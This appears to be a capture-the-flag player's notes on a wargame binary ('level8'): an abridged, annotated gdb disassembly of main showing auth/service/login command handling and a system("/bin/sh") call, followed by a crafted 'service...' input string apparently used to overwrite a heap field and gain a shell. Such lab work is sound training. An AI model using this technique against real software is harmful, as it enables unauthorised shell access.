gdb /home/user/level8/level8

set disassembly-flavor intel

disas main
Dump of assembler code for function main:
   0x08048564 <+0>:	    push   ebp
   0x08048652 <+238>:	mov    esi,edx
   0x08048654 <+240>:	mov    edi,eax
   0x08048656 <+242>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   
   0x08048658 <+244>:	seta   dl
   0x0804865b <+247>:	setb   al
   0x0804865e <+250>:	mov    ecx,edx
   0x08048660 <+252>:	sub    cl,al
   0x08048662 <+254>:	mov    eax,ecx
   0x08048664 <+256>:	movsx  eax,al
   0x08048667 <+259>:	test   eax,eax
   0x08048669 <+261>:	jne    0x8048678 <main+276>
   
   0x0804866b <+263>:	mov    eax,ds:0x8049aac
   0x08048670 <+268>:	mov    DWORD PTR [esp],eax
   0x08048673 <+271>:	call   0x8048420 <free@plt>                           ; free(auth)
   
   0x08048678 <+276>:	lea    eax,[esp+0x20]
   0x0804867c <+280>:	mov    edx,eax
   0x0804867e <+282>:	mov    eax,0x8048825                                  ; "service"
   0x08048683 <+287>:	mov    ecx,0x6
   0x08048688 <+292>:	mov    esi,edx
   0x0804868a <+294>:	mov    edi,eax
   0x0804868c <+296>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   
   0x0804868e <+298>:	seta   dl
   0x08048691 <+301>:	setb   al
   0x08048694 <+304>:	mov    ecx,edx
   0x08048696 <+306>:	sub    cl,al
   0x08048698 <+308>:	mov    eax,ecx
   0x0804869a <+310>:	movsx  eax,al
   0x0804869d <+313>:	test   eax,eax
   0x0804869f <+315>:	jne    0x80486b5 <main+337>

   0x080486a1 <+317>:	lea    eax,[esp+0x20]
   0x080486a5 <+321>:	add    eax,0x7
   0x080486a8 <+324>:	mov    DWORD PTR [esp],eax
   0x080486ab <+327>:	call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:	mov    ds:0x8049ab0,eax                             ; service = strdup()
   
   0x080486b5 <+337>:	lea    eax,[esp+0x20]
   0x080486b9 <+341>:	mov    edx,eax
   0x080486bb <+343>:	mov    eax,0x804882d                                 "login"
   0x080486c0 <+348>:	mov    ecx,0x5
   0x080486c5 <+353>:	mov    esi,edx
   0x080486c7 <+355>:	mov    edi,eax
   0x080486c9 <+357>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]

   0x080486cb <+359>:	seta   dl
   0x080486ce <+362>:	setb   al
   0x080486d1 <+365>:	mov    ecx,edx
   0x080486d3 <+367>:	sub    cl,al
   0x080486d5 <+369>:	mov    eax,ecx
   0x080486d7 <+371>:	movsx  eax,al
   0x080486da <+374>:	test   eax,eax
   0x080486dc <+376>:	jne    0x8048574 <main+16>

   0x080486e2 <+382>:	mov    eax,ds:0x8049aac
   0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20]
   0x080486ea <+390>:	test   eax,eax
   0x080486ec <+392>:	je     0x80486ff <main+411>                       ; jump if buffer[32] == 0

   0x080486ee <+394>:	mov    DWORD PTR [esp],0x8048833
   0x080486f5 <+401>:	call   0x8048480 <system@plt>                     ; system("/bin/sh")
   0x080486fa <+406>:	jmp    0x8048574 <main+16>

   0x080486ff <+411>:	mov    eax,ds:0x8049aa0
   0x08048704 <+416>:	mov    edx,eax
   0x08048706 <+418>:	mov    eax,0x804883b
   0x0804870b <+423>:	mov    DWORD PTR [esp+0xc],edx
   0x0804870f <+427>:	mov    DWORD PTR [esp+0x8],0xa
   0x08048717 <+435>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804871f <+443>:	mov    DWORD PTR [esp],eax
   0x08048722 <+446>:	call   0x8048450 <fwrite@plt>                      ; fwrite("Password:\n", 1, 10, stdout)
   0x08048727 <+451>:	jmp    0x8048574 <main+16>

   0x0804872c <+456>:	nop
   0x0804872d <+457>:	mov    eax,0x0
   0x08048732 <+462>:	lea    esp,[ebp-0x8]
   0x08048735 <+465>:	pop    esi
   0x08048736 <+466>:	pop    edi
   0x08048737 <+467>:	pop    ebp
   0x08048738 <+468>:	ret    
End of assembler dump.

serviceAAABBBBBBBBBBCCCCCCCCCCDD












